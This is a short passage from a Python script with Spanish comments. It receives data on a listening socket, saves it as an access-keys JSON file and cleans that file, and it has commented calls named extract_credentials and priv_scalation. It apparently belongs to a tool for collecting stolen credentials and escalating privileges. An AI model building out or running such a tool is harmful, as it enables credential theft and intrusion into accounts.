                buffer += decoded_data
                file.write(decoded_data)
                
                # Si detecta '}' en la salida, se detiene la recepción
                if '}' in buffer:
                    break
    except Exception as e:
        print(f"[!] Error receiving data: {e}")

    # Cerrar sockets
    client_socket.close()
    server_socket.close()

    # Limpiar el archivo para que quede únicamente el JSON
    clean_access_keys_file()

def remove_results(results):
    os.remove(results)

#extract_credentials()
#print(priv_scalation("AccessKeys.json"))
